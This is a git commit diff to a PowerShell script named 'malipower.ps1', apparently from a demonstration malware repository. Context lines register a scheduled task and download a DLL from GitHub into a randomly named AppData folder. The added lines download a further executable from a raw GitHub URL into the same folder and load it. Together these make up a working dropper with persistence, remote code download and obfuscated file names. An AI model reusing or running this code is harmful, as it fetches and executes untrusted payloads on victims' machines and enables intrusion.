bebb2502c76d8b5dbc8a5ec1c9878059ad2fbcab
tokio-oyama <103776742+tokio-oyama@users.noreply.github.com>
2022-04-15 17:29:32 -0400

    Update malipower.ps1

--- malipower.ps1
+++ malipower.ps1
@@ -33,3 +33,7 @@ Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "DHO8DE6FDE4F
 Invoke-WebRequest -Uri https://github.com/tokio-oyama/demotet/blob/main/IK4GHD32HUHI4324UIHGFD9.dll -OutFile C:\Users\IEUser\AppData\Local\DKL432BHVYUVTYF643KHJK\IK4GHD32HUHI4324UIHGFD9.dll; 
 
 Add-Type -Path 'C:\Users\IEUser\AppData\Local\DKL432BHVYUVTYF643KHJK\IK4GHD32HUHI4324UIHGFD9.dll'
+
+Invoke-WebRequest -Uri https://raw.githubusercontent.com/tokio-oyama/demotet/0a114c46cfca636168536b8aea0c590b56586935/DHIUWEGHDIUWE.exe -OutFile C:\Users\IEUser\AppData\Local\DKL432BHVYUVTYF643KHJK\DHIUWEGHDIUWE.exe;
+
+Add-Type -Path 'C:\Users\IEUser\AppData\Local\DKL432BHVYUVTYF643KHJK\DHIUWEGHDIUWE.exe'
